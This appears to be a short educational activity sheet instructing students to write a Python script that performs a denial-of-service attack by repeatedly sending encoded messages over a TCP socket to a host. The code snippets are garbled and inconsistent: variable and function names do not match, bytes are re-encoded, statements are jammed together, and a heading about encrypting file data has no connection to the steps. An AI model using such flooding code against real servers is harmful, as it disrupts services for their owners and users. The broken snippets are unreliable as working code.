Perform the DOS Attack
======================
In this activity, you will learn how the DOS attacks are made by the attacker on the server by sending encoded messages unnecessarily.




<img src= "https://s3.amazonaws.com/media-p.slid.es/uploads/2071954/images/10973669/Slide_8_v2.gif" width = "auto" height = "auto">




Follow the given steps to complete this activity.




1. Encrypt the File Data
* Open the file `main.py`.
* Fetch the IP address of the host using the .gethostbyname() method.


```
ip = socket.gethostbyname(host)


```
.
* Create a TCP socket and connect it to the port.
```
ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ddos.connect((ip_address, port))


```
* Create a random URL and store the encoded message.


```
random_url = get_random_url()


message = json.dumps(random_url).encode()


```
* Send messages using .send() and .sendto() methods.


```
ddos.send(message.encode())    ddos.sendto(message.encode(), (ip, port))
ddos.send(message.encode()) 


```


* Perform the DOS attack by calling the ddos() function. Close the connection.


```
ddos_attack(host, ip)
ddos.close()


```


* Save and run the code to check the output.
